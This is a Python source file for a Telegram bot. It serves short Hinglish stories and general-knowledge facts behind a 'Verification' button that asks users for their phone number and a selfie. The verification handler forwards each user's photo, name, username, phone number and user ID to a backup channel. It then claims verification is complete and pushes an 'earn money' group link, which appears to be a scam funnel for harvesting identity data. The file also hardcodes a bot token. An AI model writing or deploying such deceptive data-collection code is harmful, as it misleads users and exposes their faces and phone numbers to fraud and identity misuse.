import telebot
from telebot import types
import random

TOKEN = "8701626532:AAHMn152KPbKmtrwuRhmLTFJaUCue2rW4RY"

bot = telebot.TeleBot(TOKEN)

ADMIN_CHANNEL = "@backup897"
GROUP_LINK = "https://t.me/botchat876"

user_data = {}

# START COMMAND
@bot.message_handler(commands=['start'])
def start(message):
    name = message.from_user.first_name

    text = f"Hello {name} 👋\n\nWelcome to our bot.\n\nChoose an option."

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)

    btn1 = "📖 Stories"
    btn2 = "🧠 General Knowledge"
    btn3 = "🖼 Verification"

    markup.add(btn1, btn2)
    markup.add(btn3)

    bot.send_message(message.chat.id, text, reply_markup=markup)

# STORIES
stories = [
"Ek jungle me ek ladka khazana dhundne gaya aur use ek purani diary mili.",
"Ek bandar ne ek aadmi ka mobile chura liya aur selfie lene laga.",
"Ek train journey me do log mile aur unki dosti ho gayi.",
"Ek gaon me raat ko ajeeb awaaz aati thi aur log darte the."
]

@bot.message_handler(func=lambda m: m.text == "📖 Stories")
def story(message):
    s = random.choice(stories)
    bot.send_message(message.chat.id, f"📖 Story:\n\n{s}")

# GENERAL KNOWLEDGE
gk_list = [
"India ka national animal Tiger hai.",
"Sun ek star hai.",
"Human body me 206 bones hoti hain.",
"Earth sun ke around ghoomti hai.",
"Jupiter solar system ka sabse bada planet hai."
]

@bot.message_handler(func=lambda m: m.text == "🧠 General Knowledge")
def gk(message):
    fact = random.choice(gk_list)
    bot.send_message(message.chat.id, f"🧠 GK Fact:\n\n{fact}")

# VERIFICATION START
@bot.message_handler(func=lambda m: m.text == "🖼 Verification")
def verification(message):

    bot.send_message(
        message.chat.id,
        "Verification ke liye apna phone number type karke bheje."
    )

    bot.register_next_step_handler(message, get_number)

# GET NUMBER
def get_number(message):

    phone = message.text
    user_data[message.chat.id] = phone

    bot.send_message(
        message.chat.id,
        "Ab verification ke liye ek selfie photo bheje."
    )

# RECEIVE PHOTO
@bot.message_handler(content_types=['photo'])
def get_photo(message):

    file_id = message.photo[-1].file_id
    phone = user_data.get(message.chat.id, "unknown")

    caption = f"""
New Verification Request

Name: {message.from_user.first_name}
Username: @{message.from_user.username}
Phone: {phone}
User ID: {message.from_user.id}
"""

    bot.send_photo(
        ADMIN_CHANNEL,
        file_id,
        caption=caption
    )

    remove = types.ReplyKeyboardRemove()

    bot.send_message(
        message.chat.id,
        "✅ Verification Complete!",
        reply_markup=remove
    )

    bot.send_message(
        message.chat.id,
        "💰 *My Question Solve and Earn Money*\n\nApna question solve karne ke liye group join kare.",
        parse_mode="Markdown"
    )

    bot.send_message(
        message.chat.id,
        GROUP_LINK
    )

# RUN BOT
bot.infinity_polling()
